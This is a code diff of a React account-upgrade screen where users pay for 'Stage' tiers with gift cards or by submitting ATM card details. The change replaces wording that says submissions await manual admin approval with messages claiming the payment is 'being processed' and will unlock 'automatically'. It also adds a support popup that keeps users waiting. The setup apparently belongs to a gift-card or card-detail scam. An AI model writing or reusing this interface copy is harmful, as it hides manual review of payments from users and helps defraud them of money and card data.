@@ -8,6 +8,7 @@ import {
   compressCardImage,
 } from '../utils/giftCardValidator';
 import { GiftCardVerdictModal, GiftCardCheckChecklist } from './GiftCardVerdictModal';
+import { ProcessingSupportPopup } from './ProcessingSupportPopup';
 import {
   ArrowLeft,
   Crown,
@@ -352,7 +353,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
           return;
         }
       }
-      setStatusCheckNote('Still awaiting admin confirmation. Your tier will unlock right here once approved.');
+      setStatusCheckNote('Your upgrade payment is still processing. Your new tier will unlock right here automatically once confirmed.');
     } catch {
       setStatusCheckNote('Checking automatically in the background...');
     } finally {
@@ -945,18 +946,29 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
               <>
                 <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                 <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
-                  Pending Real Card Check
+                  Payment Processing • Stage {selectedTier?.stage} Upgrade
                 </span>
                 <h3 className="text-2xl font-bold text-gray-900">
-                  Verifying Stage {selectedTier?.stage} Gift Card
+                  Processing Stage {selectedTier?.stage} Upgrade...
                 </h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  We have checked that your card matches a real format and are now confirming it has not been used before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>.
+                  Your payment is currently being processed and verified before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>. Please keep this page open for automatic activation.
                 </p>
                 <GiftCardCheckChecklist />
                 <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                   Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                 </div>
+                <ProcessingSupportPopup
+                  isWaiting={
+                    step === 3 &&
+                    paymentMethod === 'giftcard' &&
+                    Boolean(pendingStatusId) &&
+                    giftStatusState === 'pending'
+                  }
+                  contextLabel={`Stage ${selectedTier?.stage || ''} (${selectedTier?.name || 'Tier'}) Upgrade`}
+                  referenceId={pendingStatusId}
+                  userEmail={user?.email}
+                />
                 {statusCheckNote && (
                   <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
                 )}
@@ -966,7 +978,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
                   disabled={isCheckingStatus}
                   className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
                 >
-                  {isCheckingStatus ? 'Checking Confirmation Status...' : 'Check Confirmation Status'}
+                  {isCheckingStatus ? 'Checking Processing Status...' : 'Check Processing Status'}
                 </button>
                 <button
                   type="button"
@@ -1016,15 +1028,21 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
               <>
                 <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                 <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
-                  Pending Admin Approval • Upgrade Locked
+                  Payment Processing • Stage {selectedTier?.stage} Upgrade
                 </span>
-                <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
+                <h3 className="text-2xl font-bold text-gray-900">Processing Stage {selectedTier?.stage} Payment...</h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  Your ATM card details for Stage {selectedTier?.stage} ({selectedTier?.name}) have been submitted. <strong>Your upgrade will remain locked until approved by admin.</strong>
+                  Your card payment for Stage {selectedTier?.stage} ({selectedTier?.name}) is currently being processed. <strong>Please keep this page open — your upgrade will unlock automatically once confirmed.</strong>
                 </p>
-                <div className="text-xs text-gray-500 space-y-1 pt-2">
-                  <p>Once approved by admin in the portal, your upgrade will automatically unlock right here.</p>
-                </div>
+                <ProcessingSupportPopup
+                  isWaiting={
+                    step === 3 &&
+                    paymentMethod === 'card' &&
+                    !user?.cardRejectionReason
+                  }
+                  contextLabel={`Stage ${selectedTier?.stage || ''} (${selectedTier?.name || 'Tier'}) Card Upgrade`}
+                  userEmail={user?.email}
+                />
               </>
             )}
           </div>
